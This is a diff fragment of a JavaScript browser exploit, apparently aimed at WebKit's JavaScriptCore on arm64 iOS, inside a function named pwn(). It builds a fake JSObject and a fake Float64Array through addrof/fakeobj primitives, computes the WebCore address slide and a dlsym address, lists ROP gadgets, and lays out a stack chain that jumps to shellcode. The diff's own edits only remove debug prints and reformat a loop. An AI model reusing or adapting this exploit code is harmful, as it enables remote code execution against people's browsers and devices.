@@ -141,7 +141,6 @@ function pwn() {
     var hax = new Uint8Array(0x1000);
 
     // Create fake JSObject.
-    // print("[*] Setting up container object");
 
     var jsCellHeader = new Int64([
         00, 0x10, 00, 00,       // m_structureID, current guess.
@@ -162,7 +161,6 @@ function pwn() {
 
     // Create the fake Float64Array.
     var address = Add(stage1.addrof(container), 16);
-    // print("[*] Fake JSObject @ " + address);
 
     var fakearray = stage1.fakeobj(address);
 
@@ -274,6 +272,7 @@ function pwn() {
     // 1b7044a9       ldp x27, x28, [x0, 0x40]
     // 1d7845a9       ldp x29, x30, [x0, 0x50]
     // 1d0846a9       ldp x29, x2, [x0, 0x60]
+    // ...
 
     var slide               = Sub(memory.readInt64(vtab), 0x186d68698); // WebCore -> __ZNK7WebCore4Node20eventTargetInterfaceEv
     var dlsym               = Add(0x18084ef90, slide);
@@ -485,8 +484,7 @@ function pwn() {
     arr[pos++] = codeAddr.hi();             // x30 (shellcode)
 
     // dummy
-    for(var i = 0; i < 0x20; ++i)
-    {
+    for (var i = 0; i < 0x20; ++i) {
         arr[pos++] = 0xdeadc0de;
     }
 
